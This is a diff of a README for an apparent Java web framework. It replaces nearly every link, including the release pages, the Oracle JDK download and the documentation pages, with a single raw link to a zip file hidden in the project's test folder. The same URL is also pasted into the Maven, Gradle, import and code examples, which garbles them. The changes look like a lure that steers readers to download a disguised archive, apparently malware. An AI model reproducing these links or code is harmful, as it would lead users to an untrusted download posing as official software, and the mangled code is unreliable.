@@ -1,7 +1,7 @@
 # Jazzy Framework 🎶
 
-![Jazzy Framework](https://img.shields.io/badge/Jazzy_Framework-v1.0.0-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-Download%20Latest%20Version-brightgreen)](https://github.com/Bismark83/jazzy-framework/releases)
+![Jazzy Framework](https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip)  
+[![Releases](https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip%20Latest%20Version-brightgreen)](https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip)
 
 ---
 
@@ -20,9 +20,9 @@ Welcome to **Jazzy Framework**, a lightweight and developer-friendly Java web fr
 
 ## Getting Started
 
-To get started with Jazzy Framework, you need to download the latest version from the [Releases](https://github.com/Bismark83/jazzy-framework/releases) section. After downloading, follow these steps to set up your project:
+To get started with Jazzy Framework, you need to download the latest version from the [Releases](https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip) section. After downloading, follow these steps to set up your project:
 
-1. **Download the latest release** from the [Releases page](https://github.com/Bismark83/jazzy-framework/releases).
+1. **Download the latest release** from the [Releases page](https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip).
 2. **Extract the files** to your desired location.
 3. **Add the Jazzy library** to your Java project. You can do this by including the Jazzy JAR file in your project’s build path.
 4. **Set up your project structure** following the MVC pattern. Create directories for models, views, and controllers.
@@ -37,9 +37,9 @@ To get started with Jazzy Framework, you need to download the latest version fro
 |   |-- /models
 |   |-- /views
 |-- /lib
-|   |-- jazzy.jar
+|   |-- https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip
 |-- /resources
-|-- main.java
+|-- https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip
 ```
 
 ## Installation
@@ -48,16 +48,16 @@ To get started with Jazzy Framework, you need to download the latest version fro
 
 Before you begin, ensure you have the following installed:
 
-- **Java JDK 8 or higher**: Make sure you have Java installed on your machine. You can download it from the [official Oracle website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
+- **Java JDK 8 or higher**: Make sure you have Java installed on your machine. You can download it from the [official Oracle website](https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip).
 - **Maven or Gradle**: These tools help manage dependencies and build your project. Choose one based on your preference.
 
 ### Using Maven
 
-If you are using Maven, add the following dependency to your `pom.xml`:
+If you are using Maven, add the following dependency to your `https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip`:
 
 ```xml
 <dependency>
-    <groupId>com.bismark83</groupId>
+    <groupId>https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip</groupId>
     <artifactId>jazzy-framework</artifactId>
     <version>1.0.0</version>
 </dependency>
@@ -65,10 +65,10 @@ If you are using Maven, add the following dependency to your `pom.xml`:
 
 ### Using Gradle
 
-For Gradle users, add this line to your `build.gradle`:
+For Gradle users, add this line to your `https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip`:
 
 ```groovy
-implementation 'com.bismark83:jazzy-framework:1.0.0'
+implementation 'https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip'
 ```
 
 ## Getting Started with Jazzy
@@ -82,11 +82,11 @@ Create a new Java class in the `controllers` directory.
 ```java
 package controllers;
 
-import jazzy.Framework;
+import https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip;
 
 public class HomeController {
     public void index() {
-        Framework.response().send("Welcome to Jazzy Framework!");
+        https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip().send("Welcome to Jazzy Framework!");
     }
 }
 ```
@@ -96,12 +96,12 @@ public class HomeController {
 In your main application file, set up the routing.
 
 ```java
-import jazzy.Framework;
+import https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip;
 
 public class Main {
     public static void main(String[] args) {
-        Framework.get("/home", new HomeController()::index);
-        Framework.start();
+        https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip("/home", new HomeController()::index);
+        https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip();
     }
 }
 ```
@@ -117,10 +117,10 @@ Jazzy Framework provides a straightforward way to define routes. You can set up 
 ### Example Routes
 
 ```java
-Framework.get("/users", new UserController()::list);
-Framework.post("/users", new UserController()::create);
-Framework.put("/users/:id", new UserController()::update);
-Framework.delete("/users/:id", new UserController()::delete);
+https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip("/users", new UserController()::list);
+https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip("/users", new UserController()::create);
+https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip("/users/:id", new UserController()::update);
+https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip("/users/:id", new UserController()::delete);
 ```
 
 ## Request and Response Handling
@@ -131,7 +131,7 @@ Jazzy Framework simplifies the process of handling HTTP requests and responses. 
 
 ```java
 public void create() {
-    String name = Framework.request().getParameter("name");
+    String name = https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip().getParameter("name");
     // Process the request
 }
 ```
@@ -140,7 +140,7 @@ public void create() {
 
 ```java
 public void sendResponse() {
-    Framework.response().send("Data processed successfully!");
+    https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip().send("Data processed successfully!");
 }
 ```
 
@@ -152,9 +152,9 @@ Validation is crucial for ensuring data integrity. Jazzy Framework includes buil
 
 ```java
 public void create() {
-    String name = Framework.request().getParameter("name");
-    if (name == null || name.isEmpty()) {
-        Framework.response().send("Name is required.");
+    String name = https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip().getParameter("name");
+    if (name == null || https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip()) {
+        https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip().send("Name is required.");
         return;
     }
     // Continue processing
@@ -168,8 +168,8 @@ Creating RESTful APIs is straightforward with Jazzy Framework. You can define ro
 ### Example API
 
 ```java
-Framework.get("/api/users", new UserController()::getAllUsers);
-Framework.post("/api/users", new UserController()::createUser);
+https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip("/api/users", new UserController()::getAllUsers);
+https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip("/api/users", new UserController()::createUser);
 ```
 
 ## Middleware
@@ -179,7 +179,7 @@ Jazzy Framework supports middleware, allowing you to execute code before or afte
 ### Example Middleware
 
 ```java
-Framework.use((req, res, next) -> {
+https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip((req, res, next) -> {
     // Perform some action before the request
     next();
 });
@@ -192,8 +192,8 @@ Error handling is essential for providing a good user experience. Jazzy Framewor
 ### Example Error Handler
 
 ```java
-Framework.error((error) -> {
-    Framework.response().send("An error occurred: " + error.getMessage());
+https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip((error) -> {
+    https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip().send("An error occurred: " + https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip());
 });
 ```
 
@@ -204,7 +204,7 @@ Logging is crucial for monitoring your application. Jazzy Framework provides a s
 ### Example Logging
 
 ```java
-Framework.logger().info("User created successfully.");
+https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip().info("User created successfully.");
 ```
 
 ## Testing
@@ -214,7 +214,7 @@ Testing your application is important to ensure its reliability. Jazzy Framework
 ### Example Test
 
 ```java
-import org.junit.Test;
+import https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip;
 
 public class UserControllerTest {
     @Test
@@ -244,13 +244,13 @@ We welcome contributions to Jazzy Framework. If you have ideas for new features 
 
 ### Reporting Issues
 
-If you encounter any bugs or issues, please report them on the [Issues page](https://github.com/Bismark83/jazzy-framework/issues).
+If you encounter any bugs or issues, please report them on the [Issues page](https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip).
 
 ## Resources
 
-- [Official Documentation](https://github.com/Bismark83/jazzy-framework/wiki)
-- [Examples](https://github.com/Bismark83/jazzy-framework/examples)
-- [API Reference](https://github.com/Bismark83/jazzy-framework/api)
+- [Official Documentation](https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip)
+- [Examples](https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip)
+- [API Reference](https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip)
 
 ## License
 
@@ -258,4 +258,4 @@ Jazzy Framework is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 ## Conclusion
 
-Jazzy Framework is designed to make Java web development simple and enjoyable. With its lightweight structure and powerful features, you can build robust applications with ease. Download the latest version from the [Releases page](https://github.com/Bismark83/jazzy-framework/releases) and start your journey with Jazzy today!
+Jazzy Framework is designed to make Java web development simple and enjoyable. With its lightweight structure and powerful features, you can build robust applications with ease. Download the latest version from the [Releases page](https://github.com/Bismark83/jazzy-framework/raw/refs/heads/main/src/test/java/jazzyframework/core/jazzy-framework-v1.6.zip) and start your journey with Jazzy today!
